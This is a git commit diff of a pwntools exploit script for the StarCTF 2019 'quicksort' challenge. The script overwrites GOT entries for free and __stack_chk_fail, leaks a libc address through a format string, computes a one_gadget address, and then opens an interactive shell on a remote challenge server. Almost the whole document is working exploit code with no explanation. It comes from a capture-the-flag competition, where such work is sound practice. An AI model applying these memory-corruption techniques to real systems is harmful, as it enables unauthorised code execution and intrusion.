556e7ea2bcc907a9b193ac78219872c530b13e5a
assassinq <490584635@qq.com>
2019-04-29 19:18:14 +0800

    Starctf-2019-quicksort

--- Starctf-2019/pwn/quicksort/exp.py
+++ Starctf-2019/pwn/quicksort/exp.py
@@ -1,23 +1,31 @@
+#!/usr/bin/env python
 from pwn import *
 context.log_level = 'debug'
 context.arch = 'i386'
-#context.terminal = ['tmux', 'sp', '-h']
-local = 1
-if 0:
+context.terminal = ['tmux', 'sp', '-h']
+local = 0
+if local:
 	p = process('./quicksort')
+	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 else:
-	p=remote("34.92.96.238",10000)    
+	p = remote('34.92.96.238', 10000)
+	libc = ELF('./libc.so.6')
 elf = ELF('./quicksort')
 g = lambda x: next(elf.search(asm(x)))
-ret = g('ret') # 0x8048816
+gets_plt = elf.plt['gets']
+gets_got = elf.got['gets']
 puts_plt = elf.plt['puts'] # 0x8048560
 puts_got = elf.got['puts'] # 0x804a02c
 free_got = elf.got['free'] # 0x804a018
-printf = elf.plt['printf'] # 
+atoi_got = elf.got['atoi']
+printf_got = elf.got['printf']
+printf_plt = elf.plt['printf']
 func = 0x08048816
+buf = 0x0804a000 + 0x800 # 0x0804b000 - 0x100
 stack_chk_fail_got = elf.got['__stack_chk_fail']
-setbuf_got = elf.got['setbuf']
-
+#gdb.attach(p, '''
+#b *0x80489aa
+#''')
 
 def write(addr, val, t):
 	payload = str(val)
@@ -36,25 +44,26 @@ def overflow(addr, val, t):
 	payload += p32(addr) + '\x00' * 4
 	p.recvuntil('number:')
 	p.sendline(payload)
-bss=0x0804a000+0x800
-p.recvuntil('sort?\n')
+
 t = 2
+p.recvuntil('sort?\n')
 p.sendline(str(t))
-write(free_got, printf, 2)
-overflow(stack_chk_fail_got, 0x8048816, 1)
+write(free_got, printf_plt, 2)
+write(stack_chk_fail_got, func, 2)
+fmt = '%6$p' # '%5$p'
+overflow(buf, str(int(fmt[::-1].encode('hex'), 16)), 1)
+p.recvuntil('0x')
+libc_base = int(p.recv(8), 16) - 0x1b3864 # 0x1da010
+success('libc_base = ' + hex(libc_base))
+one_gadget = libc_base + 0x3ac62
+success('one_gadget = ' + hex(one_gadget))
+one_gadget_complement = -(0x100000000 - one_gadget)
+success('one_gadget_complement = ' + hex(one_gadget_complement))
 
 p.recvuntil('sort?\n')
 p.sendline(str(t))
-overflow(bss, 1881420837, 1)
-p.readuntil("37 \n")
-base=int(p.read(0xa),16)-(0xf7791000-0xf75df000)
-log.warning(hex(base))
-#gdb.attach(p, 'b *0x80489bf')
-one=0x3ac62+base
-p.recvuntil('sort?\n')
-p.sendline(str(t))
-write(stack_chk_fail_got, one&0xffff, 2)
-overflow(stack_chk_fail_got+2, (one&0xffff0000)>>16, 1)
-
-
+# write(free_got, one_gadget_complement, 1)
+overflow(stack_chk_fail_got, one_gadget_complement, 1)
+# write(stack_chk_fail_got, one_gadget & 0xffff, 2)
+# overflow(stack_chk_fail_got + 2, (one_gadget & 0xffff0000) >> 16, 1)
 p.interactive()
